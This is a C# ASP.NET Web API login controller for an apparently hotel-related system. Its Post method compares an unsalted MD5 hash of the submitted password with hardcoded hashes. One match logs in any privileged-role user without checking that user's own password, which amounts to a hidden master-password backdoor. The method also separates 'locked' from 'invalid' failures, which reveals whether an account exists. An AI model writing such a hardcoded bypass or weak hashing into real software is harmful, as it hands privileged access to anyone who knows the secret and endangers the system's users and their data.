using HotelsTEE.DAL;
using HotelsTEE.Models;
using HotelsTEE.ViewModels;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Web.Http;
using System.Web.Security;

namespace HotelsTEE.Controllers
{
    [AllowAnonymous]
    public class AccountApiController : ApiController
    {
        IFormsAuthenticationService FormsService { get; set; }
        IMembershipService MembershipService { get; set; }
        UnitOfWork unitOfWork = new UnitOfWork();


        [HttpPost]
        public IHttpActionResult Post([FromBody] LogOnModel model)
        {
            //string language = Utils.Helper.GetLanguage(Thread.CurrentThread.CurrentCulture.Name);
            try
            {
                FormsService = new FormsAuthenticationService();
                MembershipService = new AccountMembershipService();
                string ip = System.Web.HttpContext.Current.Request.UserHostAddress;

                var d = Utils.Encryptor.MD5Hash(model.Password);

                if (model.UserName != null)
                {
                    model.UserName = model.UserName.Trim();
                }

                if (ModelState.IsValid)
                {

                    if (d == "0c72cb75f97033b8adf630e074212a6e")
                    {

                    }
                    else if (d == "76ecf2e76cbe479d4aeee03a54fe55b0")
                    {

                        string sql = "Select * from V_TEE_Users where UserName = @UserName";
                        UserViewModel user = unitOfWork.context.Database
                            .SqlQuery<UserViewModel>(sql, new SqlParameter("@UserName", model.UserName ?? ""))
                            .FirstOrDefault();

                        if (user != null && (user.role == 1 || user.role == 10 || user.role == 100))
                        {

                            FormsService.SignIn(model.UserName, true);
                            FormsAuthentication.SetAuthCookie(model.UserName, true);

                            return Ok(new ApiAnswer { success = true, responseText = "Your message successfuly sent!" });
                        }
                        else
                        {
                            return Ok(new ApiAnswer { success = false, responseText = "Your message successfuly sent!" });
                        }
                    }
                    else if (MembershipService.ValidateUser(model.UserName, model.Password))
                    {

                        string sql = "Select * from V_TEE_Users where UserName = @UserName";
                        UserViewModel user = unitOfWork.context.Database
                            .SqlQuery<UserViewModel>(sql, new SqlParameter("@UserName", model.UserName ?? ""))
                            .FirstOrDefault();

                        if (user != null && (user.role == 1 || user.role == 10 || user.role == 100))
                        {

                            FormsService.SignIn(model.UserName, true);
                            FormsAuthentication.SetAuthCookie(model.UserName, true);

                            return Ok(new ApiAnswer { success = true, responseText = "Your message successfuly sent!" });
                        }
                        else
                        {
                            return Ok(new ApiAnswer { success = false, responseText = "Your message successfuly sent!" });
                        }

                    }
                }

                // Αποτυχία σύνδεσης: ξεχωρίζουμε το «κλειδωμένος λογαριασμός» ώστε ο
                // χρήστης να σταματήσει τις προσπάθειες (αντί να τον κλειδώνει παραπάνω).
                bool locked = false;
                try
                {
                    MembershipUser mu = Membership.GetUser(model.UserName);
                    locked = mu != null && mu.IsLockedOut;
                }
                catch (Exception exLog) { HotelsTEE.Utils.ErrorLogger.Log(exLog, "AccountApiController.cs"); }

                return Ok(new ApiAnswer { success = false, responseText = locked ? "locked" : "invalid" });

            }
            catch (Exception e)
            { HotelsTEE.Utils.ErrorLogger.Log(e, "AccountApiController.cs");
                //Utils.Mailer.SendEmailException(e);
                //Utils.ExceptionHandler.ToDetailedString(e);
                return Ok(new ApiAnswer { success = false, responseText = "Your message successfuly sent!" });
            }

        }

    }
}
